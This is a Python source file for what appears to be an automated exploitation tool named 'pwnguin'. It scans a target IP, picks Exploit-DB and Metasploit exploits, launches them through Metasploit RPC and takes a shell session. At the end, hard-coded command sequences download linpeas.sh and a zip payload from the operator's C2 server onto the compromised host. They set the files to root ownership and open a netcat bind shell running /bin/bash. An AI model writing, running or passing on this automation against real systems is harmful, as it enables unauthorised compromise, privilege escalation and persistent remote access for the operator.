#!/usr/bin/python3

from os import path
import subprocess
import pprint
import json
from capstone import CS_OP_IMM

from netaddr import P
import autopayload
import autoexploit
from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PayloadModule
import time
from logs import LOG
import post.postexploit as postexploit
import sys

RED = "\033[1;31m"
YELLOW = "\033[33m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"

LOW = "Low"
MEDIUM = BLUE + "Medium" + RESET
HIGH = YELLOW + "High" + RESET
CRITICAL = RED + "Critical" + RESET

SEVERITY_TEXT = {"LOW": LOW, "MEDIUM": MEDIUM, "HIGH": HIGH, "CRITICAL": CRITICAL}


logfile = open("./logtest", "a+")

LOG("Launched autopwn.", logfile, "inf")

IP = "192.168.1.45"
EXPLOIT_LIST = "./exploit_list"

debug = 1


def show_pwnguin():
    """Displays pwngin ASCII art logo, nothing useful"""
    print(
        f"""
                                            (#(
                                        @@@/#&@&
                                  (&@@@,#&&@@&&&&&&&@@(
                             #@@@( %&&&&&&&@@@@@@@@@@
                         ,@@%/&&&&@@@@@@@@@@@@@@@@@@@@,
                       @@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@&
                    ,@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                   @@@&&@@&@#,,&@@@@@@@@@@@@@@@@%**%@@@@@@@@&
                 #@@@@@@%          %@@@@@@@@(          @@@@@@@,
                @@@@@@@   @@&        (@@@@,        @@&  /@@@@@@&
               @@@@@@@.    ,%@{RED}@@{RESET}&,     %     /@{RED}@@{RESET}@(,    #@@@@@@&
              @@@@@@@@    ..@@{RED}&..{RESET}@@@.    #@@{RED}@...@{RESET}@@,     @@@@@@@#
             &@@@@@@@@      {BLUE},@@@@@@{RESET}  .{YELLOW}%({RESET}  {BLUE}./@@@@@@,{RESET}      @@@@@@@@/
            /@@#&@@@@@            ,@{YELLOW}@&.  /@{RESET}@@            @@@@@&%@@
            @@/&&#@@@@@          @@{YELLOW}((/,*///%{RESET}@%          @@@@@%&&#@@
           .@&%@&@,@@@@@         .,/@{YELLOW}@/(((@{RESET}@,.          @@@@@.&&@#@@
           ,@(@@@&&,/@@@@.         ...{YELLOW}%@@/{RESET},.          ,@@@@,(&@@@&&@.
            """
    )


def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
    """Scans IP loofing for vulnerabilities and output the
    related exploit list to be parsed (in json)
    """
    if debug == 0:
        cmd = "./explookup.sh " + ip + " >> /dev/null"
        scan = subprocess.run(cmd, shell=True)
        if scan:
            msg = "Launching scan over @" + ip + " cmd :" + cmd
            print("[i] Launching scan over @" + ip + " cmd :" + cmd)
            LOG(msg, logfile, "log")
        else:
            LOG("Error 1 : nmap failed.", logfile, "err")
            print("[X] Error 1 : nmap failed.")
            exit(-1)
    with open(exploit_path, "r+") as f:
        result = json.loads(f.read())
    return result


# TODO Définir une liste d'extensions dépréciées pour les exploit récupérés sur edb.
def getEdbExploit(res=[]):
    """Retrieve EDB exploits that are missing in metasploit"""
    edbExploits = []
    for search in res:
        edbExploits += search["RESULTS_EXPLOIT"]
    paths = []
    if edbExploits:
        for pwn in edbExploits:
            if not ("(Metasploit)" in pwn["Title"]):
                paths.append(pwn["Path"])
    if paths:
        for path in paths:
            ext = str(path.split("/")[-1]).split(".")[-1]
            if not (ext in ["txt", "md"]):
                plat = str(path.split("/")[5])
                if ('lin' in plat):
                    command = "cp " + path + " ./edb/lin/" + str(path.split("/")[-1])
                elif ('mult' in plat):
                    command = "cp " + path + " ./edb/mult/" + str(path.split("/")[-1])
                elif ('win' in plat):
                    command = "cp " + path + " ./edb/win/" + str(path.split("/")[-1])
                elif ('cgi' in plat):
                    command = "cp " + path + " ./edb/cgi/" + str(path.split("/")[-1])
                else:
                    command = "cp " + path + " ./edb/oth/" + str(path.split("/")[-1])
                #   print(command)
                subprocess.run(command, shell=True)


def showEdbExploit(exploitPath = "")->None:
    with open(exploitPath,"r+") as f:
        prog = f.readlines()
    pprint.pprint(prog)


def createExploitList(res=[]) -> tuple[list[str], list[str]]:
    """Create exploits / metasploits lists from the list of research
    returns (titles, metaexploits)
    """
    exploits = []
    for search in res:
        exploits += search["RESULTS_EXPLOIT"]
    LOG("Imported exploit_list", logfile, "log")
    if exploits:
        titles = [pwn["Title"] for pwn in exploits]
        noDuplicattes = []
        [noDuplicattes.append(i) for i in titles if not noDuplicattes.count(i)]
        titles = noDuplicattes
        titles = [[k, title] for k, title in enumerate(titles)]
    else:
        LOG("Error 2 : Parsing error.", logfile, "err")
        print("[X] Error 2 : Parsing error.")
        exit(-2)
    LOG("Parsed ./exploit_list", logfile, "log")
    metaexploits = []
    for j in range(len(titles)):
        if "(Metasploit)" in titles[j][1]:
            metaexploits.append(titles[j])
    return (titles, metaexploits)


def selectExploit(choice=0, titles=[]) -> str:
    return titles[int(choice)][1][:-12]


def runMetasploit(reinit=False, show=True) -> MsfRpcClient:
    """Launch metasploit instance and returns associated client
    It is also possible to reinit the db if reinit = True (must be root!!!)
    """
    redirect = None
    if not show:
        redirect = subprocess.DEVNULL

    proc = subprocess.run(
        "msfrpcd -P yourpassword", shell=True, stdout=redirect, stderr=redirect
    )
    time.sleep(5)
    LOG("Started process msfrpcd", logfile, "inf")

    if reinit:
        proc = subprocess.run(
            "echo yes | msfdb reinit", shell=True, stdout=redirect, stderr=redirect
        )  # if db problem
        LOG("Started process msfdb (arg reinit)", logfile, "inf")

    client = MsfRpcClient("yourpassword", ssl=True)
    print("\n")
    return client


def searchModules(client: MsfRpcClient, attack: str) -> list[dict]:
    modules = client.modules.search(attack)

    print("[~] Available modules :")
    for k in range(len(modules)):
        pprint.pprint(
            str(k) + " : " + modules[k]["type"] + " : " + modules[k]["fullname"]
        )
    LOG("Displayed modules", logfile, "log")
    return modules


# TODO couper exploitVuln en 3 fonctions select exploit, select payload et exploitVuln
def selectExploitMS(
    client: MsfRpcClient, exploit_fullname: str
) -> tuple[ExploitModule, list[str]]:
    """Select the exploit to use, return it with the available payloads"""
    exploit_ms = client.modules.use("exploit", exploit_fullname)
    return exploit_ms, exploit_ms.targetpayloads()


def selectPayloadMS(client: MsfRpcClient, payload_fullname: str) -> PayloadModule:
    """Select the payload to use"""
    return client.modules.use("payload", payload_fullname)


def exploitVuln(Rhosts="192.168.1.45", Lhost="192.168.1.37", auto_mode=False, client=None, modlist=[]) -> None:
    """Execute selected payload on the targeted"""
    exploit = client.modules.use(modlist[0]["type"], modlist[0]["fullname"])
    print("[V] Selected payloads: ", exploit.info)

    print("Exploit options :")
    print(exploit.options)
    print("\n")

    plds = exploit.targetpayloads()
    print("[~] Available payloads :")
    pprint.pprint(plds)
    print("[-1 for autochosing]")
    if auto_mode :
        pay_idx = -1
    else : 
        pay_idx = int(input("Which payload do you want to use ? :"))

    print("")
    if pay_idx == -1:
        tmp = autopayload.autochose(exploit.targetpayloads())
        if tmp == -1:
            payload = client.modules.use("payload", plds[0])
            print("No usual payload available, reflected to : " + plds[0])
        else:
            payload = client.modules.use("payload", tmp)
            print("Autopayload selected : " + tmp)
    else:
        payload = client.modules.use("payload", plds[pay_idx])
    print("[V] Payload selected !")
    LOG("User selected payload", logfile, "log")
    print("\n")

    for i in payload.missing_required:
        if (i == "RHOSTS") : 
            payload[i] = Rhosts
        elif (i == "LHOST") : 
            payload[i] = Lhost
        else :
            payload[i] = input(i + ": ")

    for i in exploit.missing_required:
        if (i == "RHOSTS") : 
            exploit[i] = Rhosts
        elif (i == "LHOST") : 
            exploit[i] = Lhost
        else : 
            exploit[i] = input(i + ": ")

    print(exploit.execute(payload=payload))

    while len(client.jobs.list) != 0:
        pass


def getShell(client=None, id="1"):
    """Get shell from ID session"""
    LOG("Shell obtained", logfile, "log")
    shell = client.sessions.session(id)
    try:
        return client.sessions.session(id)
    except:
        print("Error shell")
        return -10


def sendCommands(shell, sequence=[]) -> int:
    """Automated interaction with shell on target"""
    if len(sequence) == 0:
        print("[X] Error 5 : Invalid sequence.")
        LOG("[X] Error 5 : Invalid sequence.", logfile, "err")
        return -5

    for command in sequence:
        print(command)
        shell.write(command)
        time.sleep(5)  # Todo : modifier le sleep
        print(shell.read())
    return 0


def flushProcesses() -> int:
    proc = subprocess.run(
        "kill $(ps aux | grep 'msfrpcd' | awk '{print $2}')", shell=True
    )
    print(proc)
    proc = subprocess.run(
        "kill $(ps aux | grep 'python3 -m http.server' | awk '{print $2}')", shell=True
    )
    print(proc)
    return 0


def autopwn(Rhosts="192.168.1.45",
    Lhost="192.168.1.37",
    generic_exploit=True,
    get_edb_exploits=False,
    com_and_cont=False,
    auto_mode=False,
) -> tuple[None, MsfRpcClient, str]:
    """Autopwn function."""
    show_pwnguin()

    results = scanIp4Vulnerabilities(EXPLOIT_LIST, IP)
    (exploits, metaexploits) = createExploitList(results)

    if generic_exploit & get_edb_exploits:
        getEdbExploit(results)

    if generic_exploit:
        if exploits:
            print("[~] All exploits :")
            pprint.pprint(exploits)
            print("\n")
        else:
            LOG("Error 3 : No exploits found on EDB.", logfile, "err")
            print("[X] Error 3 : No exploits found on EDB.")
            exit(-3)
        LOG("Displayed possible exploits to user", logfile, "log")

        if metaexploits:
            print("[~] Metasploit exploits :")
            pprint.pprint(metaexploits)
            print("\n")
        else:
            LOG("INFO : No exploit found on Metasploit.", logfile, "inf")
            print("[i] INFO : No exploit found on Metasploit.")
        LOG("Displayed possible exploits to user", logfile, "log")
    else:
        if metaexploits:
            print("[~] Metasploit exploits :")
            pprint.pprint(metaexploits)
            print("\n")
        else:
            LOG("INFO : No exploit found on Metasploit.", logfile, "inf")
            print("[i] INFO : No exploit found on Metasploit.")
        LOG("Displayed possible exploits to user", logfile, "log")
        
        
    if auto_mode:
        choice = "-1"
        print("[i] Automatic mode activated ! Selecting best exploit for you.")
    else:
        choice = input("[~] Please select an exploit: ")
  
    if (choice == "-1") : 
        choice = str(autoexploit.autochose(metaexploits))
        if ( choice == "-1") :
            choice = input("[~] Could not auto select, please select manually ")
    attack = selectExploit(choice, exploits)

    print("[V] Exploit selected ! :")
    print(attack)
    print("\n")
    LOG("User selected " + attack, logfile, "log")

    print("Starting msfrpcd...")
    client = runMetasploit(False)
    modlist = searchModules(client, attack)
    exploitVuln(client, modlist)

    print(client.sessions.list)
    print("\n")

    shell = getShell(client, "1")

    if com_and_cont:
        print("[~] Entering command and control section")
        LOG("Entered in C&C section", logfile, "inf")

        print("[~] Opening local C2 server ...")
        (proc, port) = postexploit.openCtrlSrv("192.168.1.45")
        ipport = "http://192.168.1.45:" + str(port)
    else:
        ipport = "0.0.0.0:0"  # Do not use ip/port if there is no command and control
    print("[V] Pwn complete !!! ")
    return (shell, client, ipport)


if __name__ == "__main__":

    # showEdbExploit("./edb/2444.sh")
    #showEdbExploit("./edb/2444.sh")

    if debug == 1:
        print("**** RUNNING IN DEBUG MODE ****")


    flushProcesses()
    
    
    if len(sys.argv) > 1:
        IP = sys.argv[1]
        Rhosts = sys.argv[1]
        if len(sys.argv) > 2:
            Lhost = sys.argv[2]

    (shell, client, srv) = autopwn(
        Rhosts="192.168.1.45",Lhost="192.168.1.37",generic_exploit=True, get_edb_exploits=True, com_and_cont=True, auto_mode=False
    )

    sequence = [
        "whoami",
        "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
        "pwd",
        "chown root:root linpeas.sh",
        "echo 0xcafedeadbeef",
        "chmod +x linpeas.sh",
        "echo matthislemechan",
    ]
    sequence2 = [
    	"cd /root",
    	"pwd",
    	"ls",
        "curl -s " + srv + "/post/main.zip -o main.zip > /dev/null",
        "unzip main.zip",
        "chown root:root pwnguin",
        "cd pwnguin",
        "chmod -R 700 .",
        "echo pwnguined",
        "nc -l -p 45678 -e /bin/bash",
    ]
    sendCommands(shell, sequence)
    sendCommands(shell, sequence2)
    
    LOG("END OF LOGS", logfile, "crit")
    logfile.close()
    exit(0)
